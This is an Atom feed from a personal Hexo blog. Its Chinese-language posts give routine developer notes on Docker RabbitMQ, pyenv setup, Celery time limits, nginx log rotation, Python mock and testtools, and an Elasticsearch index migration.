<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>leesea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-03-07T07:38:57.991Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>leesea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常用 Docker 容器</title>
    <link href="http://yoursite.com/2019/03/07/docker-common/"/>
    <id>http://yoursite.com/2019/03/07/docker-common/</id>
    <published>2019-03-07T07:35:43.000Z</published>
    <updated>2019-03-07T07:38:57.991Z</updated>
    
    <content type="html"><![CDATA[<p>主要记录开发过程中常用的容器创建命令。</p><a id="more"></a><h2 id="Rabbitmq"><a href="#Rabbitmq" class="headerlink" title="Rabbitmq"></a>Rabbitmq</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull rabbitmq</span><br><span class="line">docker run -d --hostname my-rabbit --name rabbitmq -p 15672:15672 -p 5672:5672 rabbitmq</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;主要记录开发过程中常用的容器创建命令。&lt;/p&gt;
    
    </summary>
    
      <category term="Paas" scheme="http://yoursite.com/categories/Paas/"/>
    
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>mac 常用配置</title>
    <link href="http://yoursite.com/2019/01/23/mac-config/"/>
    <id>http://yoursite.com/2019/01/23/mac-config/</id>
    <published>2019-01-23T08:12:46.000Z</published>
    <updated>2019-01-23T08:16:23.322Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要记录mac使用中的一些小问题。</p><a id="more"></a><h2 id="oh-my-zsh-去掉history共享"><a href="#oh-my-zsh-去掉history共享" class="headerlink" title="oh-my-zsh 去掉history共享"></a>oh-my-zsh 去掉history共享</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Add follow line in $ZSH/oh-my-zsh.sh</span><br><span class="line">unsetopt share_history</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里主要记录mac使用中的一些小问题。&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://yoursite.com/categories/mac/"/>
    
    
      <category term="mac" scheme="http://yoursite.com/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>使用cProfile分析python性能</title>
    <link href="http://yoursite.com/2019/01/10/cprofile/"/>
    <id>http://yoursite.com/2019/01/10/cprofile/</id>
    <published>2019-01-10T11:17:26.000Z</published>
    <updated>2019-01-10T11:26:44.030Z</updated>
    
    <content type="html"><![CDATA[<p>当我们的确是有需要开始真正优化我们的Python程序的时候，我们要做的第一步并不是盲目的去做优化，而是对我们现有的程序进行分析，发现程序的性能瓶颈进而进行针对性的优化。这样才会使我们花时间和精力去做的优化获得最大的效果。</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当我们的确是有需要开始真正优化我们的Python程序的时候，我们要做的第一步并不是盲目的去做优化，而是对我们现有的程序进行分析，发现程序的性能瓶颈进而进行针对性的优化。这样才会使我们花时间和精力去做的优化获得最大的效果。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>celery任务超时控制</title>
    <link href="http://yoursite.com/2019/01/10/celery-time-limit/"/>
    <id>http://yoursite.com/2019/01/10/celery-time-limit/</id>
    <published>2019-01-10T08:43:09.000Z</published>
    <updated>2019-01-10T08:58:42.260Z</updated>
    
    <content type="html"><![CDATA[<p>有时候celery任务的执行时间过长，如果没有有效控制可能导致mq消息大量堆积。celery 3.1以后的版本提供了超时机制。</p><a id="more"></a><h1 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h1><p>celery 提供了两个参数来控制task超时时间：</p><ul><li>task_time_limit: 在指定时间内没有完成，task会被kill，然后开始下一个task。</li><li>task_soft_time_limit: </li></ul><h2 id="在celery配置文件中使用"><a href="#在celery配置文件中使用" class="headerlink" title="在celery配置文件中使用"></a>在celery配置文件中使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time_limit = <span class="number">30</span></span><br><span class="line">soft_time_limit = <span class="number">10</span></span><br></pre></td></tr></table></figure><h2 id="在装饰器中使用"><a href="#在装饰器中使用" class="headerlink" title="在装饰器中使用"></a>在装饰器中使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mytask</span><span class="params">(time_limit=<span class="number">30</span>, soft_time_limit=<span class="number">10</span>)</span>:</span></span><br><span class="line">   do_your_job()</span><br></pre></td></tr></table></figure><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from celery.exceptions import SoftTimeLimitExceeded</span><br><span class="line"></span><br><span class="line">@app.task</span><br><span class="line">def mytask(soft_time_limit=10):</span><br><span class="line">    try:</span><br><span class="line">        return do_work()</span><br><span class="line">    except SoftTimeLimitExceeded:</span><br><span class="line">        cleanup_in_a_hurry()</span><br></pre></td></tr></table></figure><p>这里实际测试有些情况下仍然捕获不到异常，会直接抛出，出现类似打印：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[2019-01-10 15:42:13,716: ERROR/ForkPoolWorker-11] Pool process &lt;celery.concurrency.asynpool.Worker object at 0x107fddb90&gt; error: SoftTimeLimitExceeded()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 289, in __call__</span><br><span class="line">    sys.exit(self.workloop(pid=pid))</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 347, in workloop</span><br><span class="line">    req = wait_for_job()</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 447, in receive</span><br><span class="line">    ready, req = _receive(1.0)</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 419, in _recv</span><br><span class="line">    return True, loads(get_payload())</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/queues.py&quot;, line 355, in get_payload</span><br><span class="line">    return self._reader.recv_bytes()</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 245, in recv_bytes</span><br><span class="line">    buf = self._recv_bytes(maxlength)</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 458, in _recv_bytes</span><br><span class="line">    buf = self._recv(4)</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 424, in _recv</span><br><span class="line">    chunk = read(handle, remaining)</span><br><span class="line">  File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 227, in soft_timeout_sighandler</span><br><span class="line">    raise SoftTimeLimitExceeded()</span><br><span class="line">SoftTimeLimitExceeded: SoftTimeLimitExceeded()</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit" target="_blank" rel="noopener">http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时候celery任务的执行时间过长，如果没有有效控制可能导致mq消息大量堆积。celery 3.1以后的版本提供了超时机制。&lt;/p&gt;
    
    </summary>
    
      <category term="mq" scheme="http://yoursite.com/categories/mq/"/>
    
    
      <category term="celery" scheme="http://yoursite.com/tags/celery/"/>
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pyenv使用</title>
    <link href="http://yoursite.com/2019/01/10/pyenv/"/>
    <id>http://yoursite.com/2019/01/10/pyenv/</id>
    <published>2019-01-10T08:09:30.000Z</published>
    <updated>2019-01-10T08:59:28.921Z</updated>
    
    <content type="html"><![CDATA[<p>pyenv可以帮助你在一台开发机上建立多个版本的python环境， 并提供方便的切换方法。<br>virtualenv可以搭建虚拟且独立的python环境，可以使每个项目环境与其他项目独立开来，保持环境的干净，解决包冲突问题。</p><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class="line">echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.bash_profile</span><br><span class="line">echo 'export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.bash_profile</span><br><span class="line">echo -e 'if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then\n  eval "$(pyenv init -)"\nfi' &gt;&gt; ~/.bash_profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> restart shell</span></span><br><span class="line">exec "$SHELL"</span><br></pre></td></tr></table></figure><h1 id="安装python-版本"><a href="#安装python-版本" class="headerlink" title="安装python 版本"></a>安装python 版本</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 2.7.8</span><br></pre></td></tr></table></figure><p>如果系统没有安装<code>patch</code>命令，在安装python的时候会报如下错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.pyenv/plugins/python-build/bin/python-build: line 1326: patch: command not found</span><br></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install patch -y</span><br></pre></td></tr></table></figure><h1 id="pyenv-virtualenv"><a href="#pyenv-virtualenv" class="headerlink" title="pyenv-virtualenv"></a>pyenv-virtualenv</h1><p>光有pyenv还不够，我们需要结合virtualenv来使用, pyenv-virtualenv就是干这个活的。</p><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">echo 'eval "$(pyenv virtualenv-init -)"' &gt;&gt; ~/.bash_profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> restart shell</span></span><br><span class="line">exec "$SHELL"</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建项目</span></span><br><span class="line">pyenv virtualenv 2.7.10 project</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Activate virtualenv</span></span><br><span class="line">pyenv activate project</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Deactive virtualenv</span></span><br><span class="line">pyenv deactivate</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Delete existing virtualenv</span></span><br><span class="line">pyenv uninstall project</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://github.com/pyenv/pyenv#installation" target="_blank" rel="noopener">https://github.com/pyenv/pyenv#installation</a><br>[2] <a href="https://github.com/pyenv/pyenv-virtualenv" target="_blank" rel="noopener">https://github.com/pyenv/pyenv-virtualenv</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pyenv可以帮助你在一台开发机上建立多个版本的python环境， 并提供方便的切换方法。&lt;br&gt;virtualenv可以搭建虚拟且独立的python环境，可以使每个项目环境与其他项目独立开来，保持环境的干净，解决包冲突问题。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>nginx_log</title>
    <link href="http://yoursite.com/2019/01/08/nginx-log/"/>
    <id>http://yoursite.com/2019/01/08/nginx-log/</id>
    <published>2019-01-08T06:51:31.000Z</published>
    <updated>2019-01-08T06:56:35.283Z</updated>
    
    <content type="html"><![CDATA[<p>nginx 日志需要自己进程转储。</p><a id="more"></a><h2 id="crontab-方式"><a href="#crontab-方式" class="headerlink" title="crontab 方式"></a>crontab 方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv access.log access.log.0</span><br><span class="line">kill -USR1 `cat master.nginx.pid`</span><br><span class="line">sleep 1</span><br><span class="line">gzip access.log.0    # do something with access.log.0</span><br></pre></td></tr></table></figure><p><a href="https://www.nginx.com/resources/wiki/start/topics/examples/logrotation/" target="_blank" rel="noopener">Log Rotation</a></p><h2 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h2><p>在 /etc/logrotate.d/nginx 文件中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access/access.log &#123; </span><br><span class="line">rotate 3</span><br><span class="line">size=50G</span><br><span class="line">missingok</span><br><span class="line">notifempty</span><br><span class="line">compress</span><br><span class="line">delaycompress</span><br><span class="line">sharedscripts</span><br><span class="line">    postrotate</span><br><span class="line">    /usr/sbin/nginx -s reload &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;nginx 日志需要自己进程转储。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>testtools</title>
    <link href="http://yoursite.com/2018/12/21/testtools/"/>
    <id>http://yoursite.com/2018/12/21/testtools/</id>
    <published>2018-12-21T07:27:25.000Z</published>
    <updated>2018-12-21T07:39:11.365Z</updated>
    
    <content type="html"><![CDATA[<p>testools是属于python中诸多自动化框架中的一个, 是python标准库中unittest的扩展。</p><a id="more"></a><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>更好的assertion method</li><li>更多的调试信息</li><li>扩展自unittest，但是兼容unittest</li><li>支持不同python版本</li></ul><h2 id="assertion"><a href="#assertion" class="headerlink" title="assertion"></a>assertion</h2><ul><li><p>assertRaises</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_square_bad_input</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="comment"># 'square' raises a TypeError if it's given bad input, say a</span></span><br><span class="line">  <span class="comment"># string.</span></span><br><span class="line">  e = self.assertRaises(TypeError, silly.square, <span class="string">"orange"</span>)</span><br><span class="line">  self.assertEqual(<span class="string">"orange"</span>, e.bad_value)</span><br><span class="line">  self.assertEqual(<span class="string">"Cannot square 'orange', not a number."</span>, str(e))</span><br></pre></td></tr></table></figure></li><li><p>ExpectedException</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_square_root_bad_input_2</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="comment"># 'square' raises a TypeError if it's given bad input.</span></span><br><span class="line">  <span class="keyword">with</span> ExpectedException(TypeError, <span class="string">"Cannot square.*"</span>):</span><br><span class="line">      silly.square(<span class="string">'orange'</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;testools是属于python中诸多自动化框架中的一个, 是python标准库中unittest的扩展。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python mock使用</title>
    <link href="http://yoursite.com/2018/12/20/mock/"/>
    <id>http://yoursite.com/2018/12/20/mock/</id>
    <published>2018-12-20T14:02:28.000Z</published>
    <updated>2019-01-10T08:39:10.662Z</updated>
    
    <content type="html"><![CDATA[<p>在测试中可以使用mock来模拟很多场景，而不需要去真正的执行代码。例如数据库查询，网络请求等。</p><a id="more"></a><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li>patching 方法</li><li>记录方法调用情况</li></ul><p>查看方法是否通过正确的参数调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProductionClass</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.something(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">something</span><span class="params">(self, a, b, c)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">real = ProductionClass()</span><br><span class="line">real.something = MagicMock()</span><br><span class="line">real.method()</span><br><span class="line">real.something.assert_called_once_with(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="Mock类型"><a href="#Mock类型" class="headerlink" title="Mock类型"></a>Mock类型</h2><p>Mock用来创建一个要模拟的对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mock.Mock(spec=<span class="keyword">None</span>, side_effect=<span class="keyword">None</span>, return_value=DEFAULT,</span><br><span class="line">          wraps=<span class="keyword">None</span>, name=<span class="keyword">None</span>, spec_set=<span class="keyword">None</span>, unsafe=<span class="keyword">False</span>, **kwargs)</span><br></pre></td></tr></table></figure><ul><li><code>spec:</code> 该参数代表要mock的对象，可以是list, strings, 类或者对象。如果传的是一个对象，会调用<code>dir()</code>,访问dir结果之外的属性都会报<code>AttributeError</code>.如果传的是对象，<code>__class__</code>会返回原来的类型。</li><li><code>return_value:</code> mock对象调用的返回值,默认是Mock对象。</li><li><code>side_effect:</code> 会覆盖<code>return_value</code>的返回值，一般用在抛异常或者动态改变返回值。</li></ul><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><ul><li><p><code>return_value</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mock</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Production</span><span class="params">(ojbect)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_hello</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'hello world'</span> </span><br><span class="line"></span><br><span class="line">m1 = mock.Mock(spec=Production)</span><br><span class="line">m2 = mock.Mock(spec=Production, return_value=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> m1()             <span class="comment"># &lt;Mock name='mock()' id='4443060048'&gt;</span></span><br><span class="line"><span class="keyword">print</span> m2()             <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">print</span> type(m1())       <span class="comment"># &lt;class 'mock.mock.Mock'&gt;</span></span><br><span class="line"><span class="keyword">print</span> type(m2())       <span class="comment"># &lt;type 'int'&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>side_effect</code>的值可以是函数，可迭代对象或者是异常。</p><ul><li>如果传参是函数，则会和mock使用相同的参数并调用。如果函数的返回值是<code>DEFAULT</code>怎使用正常的返回值（return_value指定的），否则返回函数的返回值。</li><li>如果传参是可迭代对象，则每次调用使用迭代器的返回值。</li><li>如果传参是异常，则调用会抛指定异常。</li></ul><p>设置异常:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock = Mock()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock.side_effect = Exception(<span class="string">'Boom!'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">Exception: Boom!</span><br></pre></td></tr></table></figure><p>设置可迭代对象:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock = Mock()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock.side_effect = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock(), mock(), mock()</span><br><span class="line">(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>设置函数，这里返回<code>DEFAULT</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock = Mock(return_value=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">side_effect</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> DEFAULT</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock.side_effect = side_effect</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>通过参数指定：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>side_effect = <span class="keyword">lambda</span> value: value + <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock = Mock(side_effect=side_effect)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock(<span class="number">3</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock(<span class="number">-8</span>)</span><br><span class="line"><span class="number">-7</span></span><br></pre></td></tr></table></figure><p>设置为None：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = Mock(side_effect=KeyError, return_value=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"> ...</span><br><span class="line">KeyError</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.side_effect = <span class="keyword">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul><p>MagicMock是Mock的子类，它实现了大部分的<code>magic method</code>，而不需要你自己去配置。</p><h2 id="patch-装饰器"><a href="#patch-装饰器" class="headerlink" title="patch 装饰器"></a>patch 装饰器</h2><h3 id="mock-patch"><a href="#mock-patch" class="headerlink" title="mock.patch"></a>mock.patch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mock.patch(target, new=DEFAULT, spec=<span class="keyword">None</span>, create=<span class="keyword">False</span>, spec_set=<span class="keyword">None</span>,</span><br><span class="line">           autospec=<span class="keyword">None</span>, new_callable=<span class="keyword">None</span>, **kwargs)</span><br></pre></td></tr></table></figure><p>patch() 可以作为函数装饰器，类装饰器或上下文管理器。</p><p>如果没有指定<code>new</code>参数，patch对象会使用<code>MagiMock</code>替换。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在测试中可以使用mock来模拟很多场景，而不需要去真正的执行代码。例如数据库查询，网络请求等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>记一次elasticsearch 索引迁移</title>
    <link href="http://yoursite.com/2018/12/20/es-migration/"/>
    <id>http://yoursite.com/2018/12/20/es-migration/</id>
    <published>2018-12-20T05:57:32.000Z</published>
    <updated>2018-12-20T06:36:47.422Z</updated>
    
    <content type="html"><![CDATA[<p>由于公司机房调整，需要将ES数据从一个集群迁移到另一集群。两个集群ES都是5.x版本，小版本存在差异，目标集群版本更低。数据由多个索引构成，每个索引大概1TB左右。</p><a id="more"></a><h2 id="迁移方式"><a href="#迁移方式" class="headerlink" title="迁移方式"></a>迁移方式</h2><p>查阅官方资料，提供了三种ES数据迁移方式：<a href="https://www.elastic.co/guide/en/cloud/current/ec-migrate-data.html" target="_blank" rel="noopener">Migrating Your Elasticsearch Data</a></p><p>从资料看，<code>Restore From a Snapshot</code> 方式最快，适合备份大量数据，但是这种方式必须要求是相同版本或者是从低版本到高版本迁移，不适用目前场景，所以先排除。再看<code>Reindex from a remote cluster</code>, 这种方式也比较灵活，但在使用时需要在目标集群配置 <code>reindex.remote.whitelist</code>,由于集群已经上线，且是公用的，所有不能修改配置，排除这种方式。最后只有<code>Index From the Source</code>方式可以选择。</p><p>这种方式说白了就是通过http请求来完成的，一种方式是把原始索引保存到文件，然后再目标ES集群通过文件恢复。另一种方式是直接从原始ES集群读取请求，然后POST到目标集群。由于这里数据量比较大，保存文件的方式不太现实，只能通过网络发送。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>如果采用<code>from + size</code>方式会有深度分页问题，这里采用<code>scroll + bulk</code>方式。</p><p>这里可以自己写脚本完成，可以通过 <a href="https://github.com/medcl/esm-abandoned" target="_blank" rel="noopener">esm</a>工具完成。需要注意的是自己写脚本需要有重试机制，否则每次失败都得重来。esm工具不支持后台运行，通过<code>nohup</code>和<code>&amp;</code>操作并没有效果，如需后台运行，配合<code>screen</code>工具使用。</p><p>还有一点需要注意的是，如果是跨机房拷贝，工具最好在同一个机房运行，否则会有很大的延时。通过测试esm工具拷贝500GB的索引,配置5个进程大概在2h左右。这里建议不要同时拷贝太多的索引，以免集群扛不住挂掉。</p><p>如果失败了，只能重新开始，因为scroll每次的结果并不是一样的，没法从断电继续运行。</p>]]></content>
    
    <summary type="html">
    
